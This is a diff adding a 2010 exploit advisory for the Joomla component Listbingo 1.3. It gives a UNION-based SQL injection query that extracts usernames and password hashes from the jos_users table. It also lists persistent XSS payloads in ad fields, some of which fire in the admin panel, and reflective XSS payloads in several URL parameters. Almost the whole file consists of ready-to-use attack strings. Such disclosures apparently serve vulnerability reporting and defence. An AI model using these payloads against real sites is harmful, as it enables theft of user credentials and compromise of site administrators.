@@ -1,0 +1,61 @@
+# Exploit Title: Joomla Component Listbingo 1.3 Multiple Vulnerabilities
+# Date: 09 June 2010
+# Author: jdc
+# Software Link:
+http://extensions.joomla.org/extensions/ads-a-affiliates/classified-ads/12062
+# Version: 1.3
+# Tested on: PHP5, MySQL5
+
+
+SQL Injection
+-------------
+?q=11111
+&catid=0
+&search_from_price=999 union all select
+1,2,version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,concat(username,char(32),password),32,33,34,35,36,37
+from `jos_users` -- '
+&search_to_price=2
+&search=Search
+&task=ads.search
+&option=com_listbingo
+
+
+Persistent XSS
+--------------
+?option=com_listbingo&task=categories
+"Title" field:
+
+title"/style="position:absolute;top:0;left:0;width:99em;height:99em"/onmouseover="alert(1);//
+
+NOTE: also executes in admin if ad is edited
+---
+"Address 2" field:
+addr"/onmouseover="alert(1);//
+"Zipcode" field:
+10101"/onmouseover="alert(1);//
+
+NOTE: only executes in admin if ad is edited
+
+
+Reflective XSS
+--------------
+?option=com_listbingo
+&task=regions
+&cid=225
+&time=1276063938
+&Itemid=45"/style="position:absolute;top:0;left:0;width:99em;height:99em"/onmouseover="alert(1);//
+---
+?option=com_listbingo
+&task=ads
+&time=1276064182
+&Itemid=45"/style="position:absolute;top:0;left:0;width:99em;height:99em"/onmouseover="alert(1);//
+---
+?option=com_listbingo
+&task=categories
+&Itemid=45"/style="position:absolute;top:0;left:0;width:99em;height:99em"/onmouseover="alert(1);//
+---
+?option=com_listbingo
+&task=myads
+&q=foo"/onmouseover="alert(1);//
+
+jdc 2010
